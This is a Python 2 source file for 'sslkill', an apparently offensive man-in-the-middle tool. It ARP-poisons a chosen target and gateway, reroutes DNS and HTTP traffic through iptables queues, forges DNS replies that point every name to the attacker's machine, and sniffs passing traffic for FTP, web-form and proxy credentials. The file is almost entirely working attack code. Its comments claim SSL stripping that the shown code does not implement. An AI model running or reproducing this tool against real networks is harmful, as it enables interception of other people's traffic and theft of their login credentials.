#!/usr/bin/env python2.7
#coding=UTF-8

# Copyright (c) 2016 Angelo Moura
#
# This file is part of the program sslkill
#
# sslkill is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

version = 0.2
banner = """\n

  ██████   ██████  ██▓        ██ ▄█▀ ██▓ ██▓     ██▓
▒██    ▒ ▒██    ▒ ▓██▒        ██▄█▒ ▓██▒▓██▒    ▓██▒
░ ▓██▄   ░ ▓██▄   ▒██░       ▓███▄░ ▒██▒▒██░    ▒██░
  ▒   ██▒  ▒   ██▒▒██░       ▓██ █▄ ░██░▒██░    ▒██░
▒██████▒▒▒██████▒▒░██████▒   ▒██▒ █▄░██░░██████▒░██████▒
▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░ ▒░▓  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░
░ ░▒  ░ ░░ ░▒  ░ ░░ ░ ▒  ░   ░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░
░  ░  ░  ░  ░  ░    ░ ░      ░ ░░ ░  ▒ ░  ░ ░     ░ ░
      ░        ░      ░  ░   ░  ░    ░      ░  ░    ░  ░

		      SSL Kill v{}

by: m4n3dw0lf""".format(version)

help = """\nusage:
  python sslkill.py -i <INTERFACE> -t <TARGET IP> -g <GATEWAY IP>

example:
  python sslkill.py -i wlan0 -t 10.0.0.3 -g 10.0.0.1
\n""".format(version)

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import os
import sys
import threading
import fcntl
import struct
from time import sleep
from scapy.all import *
from netfilterqueue import NetfilterQueue


class SSLKiller(object):
	def __init__(self, interface, target, gateway):
		print banner
		print
		self.interface = interface
		print "[+] Interface: {}".format(self.interface)
		def nic_ip(interface):
			try:
		        	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		        	return socket.inet_ntoa(fcntl.ioctl(
		        	        s.fileno(),
        			        0x8915,
        			        struct.pack('256s', interface[:15])
		        	)[20:24])
			except IOError:
				print "[!] Select a valid network interface, exiting ..."
				exit(0)

		def nic_mac(interface):
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        		info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', interface[:15]))
        		return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]

		self.hostIP = nic_ip(self.interface)
		print "[+] This host IP Address: {}".format(self.hostIP)
		self.hostMAC = nic_mac(self.interface)
		print "[+] This host MAC Address: {}".format(self.hostMAC)

		def resolve_mac(ip):
			try:
				conf.verb = 0
				ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=ip), timeout=2)
				for snd, rcv in ans:
					return str(rcv[Ether].src)
			except socket.gaierror:
				print "[!] Select a valid IP Address as target/gateway, exiting ..."
				exit(0)
		self.targetIP = target
		print "[+] Target IP Address: {}".format(self.targetIP)
		self.targetMAC = resolve_mac(self.targetIP)
		print "[+] Target MAC Address: {}".format(self.targetMAC)
		self.gatewayIP = gateway
		print "[+] Gateway IP Address: {}".format(self.gatewayIP)
		self.gatewayMAC = resolve_mac(self.gatewayIP)
		print "[+] Gateway MAC Address: {}".format(self.gatewayMAC)
		if not self.targetMAC or not self.gatewayMAC:
			print "[!] Failed to resolve MAC Address, check if IP Address is online, exiting ..."
			exit(0)
		animation = "|/-\\"
		for i in range(15):
		    time.sleep(0.1)
		    sys.stdout.write("\r" + "[" + animation[i % len(animation)] + "]" + " Loading SSL Kill ...")
	    	    sys.stdout.flush()
		self.ArpPoisoner()
		sys.stdout.write("\n[+] ARP Poisoner thread loaded")
		self.SSLTrickster()
		print "\n[+] SSL Trickster thread loaded"
		pcap = sniff(prn=self.Sniffer, iface=self.interface)

	def ArpPoisoner(self):
		#ARP Spoof both ways, target and gateway
		def ArpThread():
			t = threading.Thread(name='ARPspoof', target=ArpPoison)
			t.setDaemon(True)
			t.start()
		def ArpPoison():
			os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
			socket_L2 = conf.L2socket(iface=self.interface)
			while True:
				sleep(3)
				socket_L2.send(Ether(src=self.hostMAC, dst=self.targetMAC)/ARP(hwsrc=self.hostMAC, psrc=self.gatewayIP, op="is-at"))
				socket_L2.send(Ether(src=self.hostMAC, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.hostMAC, psrc=self.targetIP, op="is-at"))
		ArpThread()
		#ArpPoison()

	def SSLTrickster(self):
		#Use netfilterqueue + scapy to manipulate DNS and HTTP packets "
		#in order to avoid preloaded HSTS lists, strip SSL links, "
		#strip HTTP(s) protections (headers/scripts) and poison the "
		#DNS queries"

		def callback(packet):
			payload = packet.get_payload()
			pkt = IP(payload)
			if not pkt.haslayer(DNSQR):
				packet.accept()
			else:
		        	new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                                	  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.hostIP))
                               	packet.set_payload(str(new_pkt))
                                packet.accept()

		def goThread():
			t = threading.Thread(name='SSLTrickster', target=goTrickster)
			t.setDaemon(True)
			t.start()

		def goTrickster():
			os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
			os.system('iptables -t nat -A PREROUTING -p udp --sport 53 -j NFQUEUE --queue-num 1')
			os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j NFQUEUE --queue-num 1')
			os.system('iptables -t nat -A PREROUTING -p tcp --sport 80 -j NFQUEUE --queue-num 1')
			q = NetfilterQueue()
			q.bind(1, callback)
			q.run()
		goThread()
		#goTrickster()

	def Sniffer(self, p):
		#Sniff for credentials
        	if p.haslayer(TCP):
                	if p.haslayer(Raw):
				load = str(p[Raw].load).replace("\n"," ")
				p[Raw].load
                                user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Ll]ogin|[Ll]ogin[Ii][Dd]|[Uu]name|[Uu]suario)=([^&|;]*)'
                                pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
                                pxy_regex = '([Ww]ww-[Aa]uthorization:|[Ww]ww-[Aa]uthentication:|[Pp]roxy-[Aa]uthorization:|[Pp]roxy-[Aa]uthentication:) Basic (.*?) '
                                if load.startswith('USER'):
                                        method = load.split("USER")
                                        user = str(method[1]).split("\r")
                                        print "\n[$$$] FTP Login found: " + ''.join(user) + "\n"
                                elif load.startswith('PASS'):
                                        method = load.split("PASS")
                                        passw = str(method[1]).split("\r")
                                        print "\n[$$$] FTP Password found: " + ''.join(passw) + "\n"
                                else:
                                        users = re.findall(user_regex, load)
                                        passwords = re.findall(pw_regex, load)
                                        proxy = re.findall(pxy_regex, load)
		        	        if users:
        			                print "\n[$$$] Login found: " + str(users[0][1]) + "\n"
        			        if passwords:
        			                print "\n[$$$] Password found: " + str(passwords[0][1]) + "\n"
        			        if proxy:
        			                try:
        			                        print "\n[$$$] Proxy credentials: " + str(proxy[0][1]).decode('base64') + "\n"
        			                except:
        	        		                print "\n[$$$] Proxy credentials: " + str(proxy[0][1]) + "\n"
		else:
			return

if __name__ == "__main__":

	print "\n\n[!!!]              TOOL NOT YET AVAILABLE             [!!!]\n\n"
	try:
		for x in sys.argv:
			if x == "-h":
				print banner
				print help
				exit(0)
			if x == "-i":
				index = sys.argv.index(x) + 1
				interface = sys.argv[index]
			if x == "-t":
				index = sys.argv.index(x) + 1
				target = sys.argv[index]
			if x == "-g":
				index = sys.argv.index(x) + 1
				gateway = sys.argv[index]
		sslkill = SSLKiller(interface, target, gateway)
	except KeyboardInterrupt:
		print "[!] Aborted..."
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		exit(0)
	except Exception as e:
		print banner
		print help
		print "[!] Exception caught: {}".format(e)
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		exit(0)
	os.system('iptables -t nat -F')
